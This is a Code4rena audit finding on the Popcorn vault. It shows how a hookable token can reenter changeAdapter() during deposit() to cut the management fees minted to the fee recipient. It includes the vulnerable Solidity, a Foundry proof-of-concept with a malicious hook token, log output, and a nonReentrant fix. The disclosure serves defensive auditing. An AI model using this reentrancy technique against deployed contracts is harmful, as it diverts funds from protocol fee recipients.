## Tags

- bug
- 2 (Med Risk)
- disagree with severity
- downgraded by judge
- primary issue
- selected for report
- sponsor acknowledged
- M-28

# [Reentrancy abuse to reduce the minted management fees when changing an adapter](https://github.com/code-423n4/2023-01-popcorn-findings/issues/244) 

# Lines of code

https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L151-L153
https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L480-L491
https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L594-L613


# Vulnerability details

## Impact
Vaults using hookable tokens present a reentrancy upon changing adapter. Each vault has the `takeFees()` modifier that processes performance and management fees. That modifier is invoked only in two opportunities: `takeManagementAndPerformanceFees()` (external non access controlled) and when changing an adapter with `changeAdapter()` (external, non access controlled and depends on having a previously proposed adapter).

The `takeFees()` modifier consumes from the `totalAssets()` balance to calculate the amount of management fees via `accruedManagementFee()`:

```solidity
    function accruedManagementFee() public view returns (uint256) {
        uint256 managementFee = fees.management;
        return
            managementFee > 0
                ? managementFee.mulDiv(
                    totalAssets() * (block.timestamp - feesUpdatedAt),
                    SECONDS_PER_YEAR,
                    Math.Rounding.Down
                ) / 1e18
                : 0;
    }
```

However, a vault using hookable tokens can perform a reentrancy if the following conditions are met:

- There is a proposed new adapter
- The time to change that adapter has passed (meaning that the `changeAdapter()` call will go through)

```solidity
    function changeAdapter() external takeFees {
        if (block.timestamp < proposedAdapterTime + quitPeriod)
            revert NotPassedQuitPeriod(quitPeriod);

        adapter.redeem(
            adapter.balanceOf(address(this)),
            address(this),
            address(this)
        );

        asset.approve(address(adapter), 0);

        emit ChangedAdapter(adapter, proposedAdapter);

        adapter = proposedAdapter;

        asset.approve(address(adapter), type(uint256).max);

        adapter.deposit(asset.balanceOf(address(this)), address(this));
    }
```

This reentrancy will be triggered by a hook called before the `safeTransferFrom()` upon `deposit()` and the instructions performed inside that hook will occur after `_mint()` and before the assets are effectively transferred to the vault:

```solidity
    function deposit(uint256 assets, address receiver)
        public
        nonReentrant
        whenNotPaused
        syncFeeCheckpoint
        returns (uint256 shares)
    {
        if (receiver == address(0)) revert InvalidReceiver();

        uint256 feeShares = convertToShares(
            assets.mulDiv(uint256(fees.deposit), 1e18, Math.Rounding.Down)
        );

        shares = convertToShares(assets) - feeShares;

        if (feeShares > 0) _mint(feeRecipient, feeShares);

        _mint(receiver, shares);

        asset.safeTransferFrom(msg.sender, address(this), assets);

        adapter.deposit(assets, address(this));

        emit Deposit(msg.sender, receiver, assets, shares);
    }
```

The hookable token can call `changeAdapter()` in a before transfer hook and the contract will use outdated balance values. This is because the vault increases the amount of shares before capturing the assets.

## Proof of Concept
A vault with a hookable token is deployed by Alice. The used token allows users to create custom hooks that run before and/or after each call. A change of adapter is enqueued.

- Alice proposes a new adapter via `proposeAdapter()`
- Bob creates a hook that is executed before transferring the assets to the vault that calls `changeAdapter()`
- Bob triggers a `vault.deposit()` when the quit period passed (so the `changeAdapter()` call does not revert)
- The hook reenters the `takeFees()` modifier via the `changeAdapter()` call and proceeds to mint management fees to the `feeRecipient`.
- Because the amount of assets is outdated, the fees minted to the recipient are considerably less.  


### Output:

```
==================== NO REENTRANCY ====================
===== Called takeManagementAndPerformanceFees() =====
  Entered takeFees()
  Current assets: 20000000000000000000
  Mitable totalFees: 0
  Entered takeManagementAndPerformanceFees()
  
===== Called changeAdapter() =====
  Entered takeFees()
  Current assets: 30000000000000000000
  Mitable totalFees: 106785687124496159
  Entered changeAdapter()


==================== WITH REENTRANCY ====================
===== Called takeManagementAndPerformanceFees() =====
  Entered takeFees()
  Current assets: 20000000000000000000
  Mitable totalFees: 0
  Entered takeManagementAndPerformanceFees()
  
===== Called reentrant deposit() =====
  Entered takeFees()
  Current assets: 20000000000000000000
  Mitable totalFees: 71190458082997439
  Entered changeAdapter()
  Entered takeFees()
  Current assets: 0
  Mitable totalFees: 0
  Entered changeAdapter()
  Entered takeFees()
  Current assets: 0
  Mitable totalFees: 0
  Entered changeAdapter()
  
===== Called takeManagementAndPerformanceFees() =====
  Entered takeFees()
  Current assets: 30010000000000000000
  Mitable totalFees: 0
  Entered takeManagementAndPerformanceFees()
```

With the deposit and current amount of shares used for the PoC, it can be seen how the reentrant call yields in a total of `7.119e16` minted shares whereas a normal non-reentrant flow mints `1.06e17`. This means that a `33%` of the fees are not transferred to the recipient.

The output was built by adding console logs inside each relevant Vault's function. To reproduce both non reentrant and reentrant scenarios comment the token hook and the respective parts of the PoC.

```solidity
  function test__readOnlyReentrancy() public {
    vm.prank(alice);
    MockERCHook newToken = new MockERCHook("ERCHook", "HERC", 18);
    MockERC4626 newAdapter = new MockERC4626(IERC20(address(newToken)), "Mock Token Vault", "vwTKN");
    
    address vaultAddress = address(new Vault());

    Vault newVault = Vault(vaultAddress);
    newVault.initialize(
      IERC20(address(newToken)),
      IERC4626(address(newAdapter)),
      VaultFees({ deposit: 0, withdrawal: 0, management: 1e17, performance: 0 }),
      feeRecipient,
      address(this)
    );

    newToken.mockSetVault(newVault);
    assertTrue(newToken.vault() == newVault);

    MockERC4626 newProposedAdapter = new MockERC4626(IERC20(address(newToken)), "Mock Token Vault", "vwTKN");
    uint256 depositAmount = 100 ether;
    vm.label(address(newAdapter), "OldAdapter");
    vm.label(address(newProposedAdapter), "ProposedAdapter");

    // Deposit funds to generate some shares
    newToken.mint(alice, depositAmount);
    newToken.mint(bob, depositAmount);

    vm.startPrank(alice);
    newToken.approve(address(newVault), depositAmount);
    newVault.deposit(10 ether, alice);
    newToken.transfer(address(newVault), 0.01 ether);
    vm.stopPrank();

    vm.startPrank(bob);
    newToken.approve(address(newVault), depositAmount);
    newVault.deposit(10 ether, bob);
    vm.stopPrank();

    // Increase assets in asset Adapter 
    newToken.mint(address(adapter), depositAmount);
 
    // Update current rewards
    console.log("\n===== Called takeManagementAndPerformanceFees() =====");
    newVault.takeManagementAndPerformanceFees();
    vm.warp(block.timestamp + 10 days);

    // Preparation to change the adapter
    newVault.proposeAdapter(IERC4626(address(newProposedAdapter)));
    vm.warp(block.timestamp + 3 days + 100);

    // // Normal call
    // vm.prank(bob);
    // newVault.deposit(10 ether, bob);
    // vm.expectEmit(false, false, false, true, address(newVault));
    // emit ChangedAdapter(IERC4626(address(newAdapter)), IERC4626(address(newProposedAdapter)));
    // console.log("\n===== Called changeAdapter() =====");
    // newVault.changeAdapter();

    // Hooked call
    vm.startPrank(bob);
    vm.expectEmit(false, false, false, true, address(newVault));
    emit ChangedAdapter(IERC4626(address(newAdapter)), IERC4626(address(newProposedAdapter)));
    console.log("\n===== Called reentrant deposit() =====");
    newVault.deposit(10 ether, bob);

    console.log("\n===== Called takeManagementAndPerformanceFees() =====");
    newVault.takeManagementAndPerformanceFees();
  }

 contract MockERCHook is MockERC20 {
   Vault public vault;
   uint256 internal timesEntered = 0;
   constructor(
     string memory name_,
     string memory symbol_,
     uint8 decimals_
   ) MockERC20(name_, symbol_, decimals_) {  }

   function _beforeTokenTransfer(address , address , uint256 ) internal override {
     if(timesEntered == 0){
       try vault.changeAdapter() { // -------- STRUCTURE USED FOR SIMPLICITY
         timesEntered++;
       } catch {}
     }
   }

   function mockSetVault(Vault _vault) external {
     vault = _vault;
   }

 }
```

## Tools Used
Manual Review

## Recommended Mitigation Steps
Consider adding the `nonReentrant` modifier to the `changeAdapter()` function. 
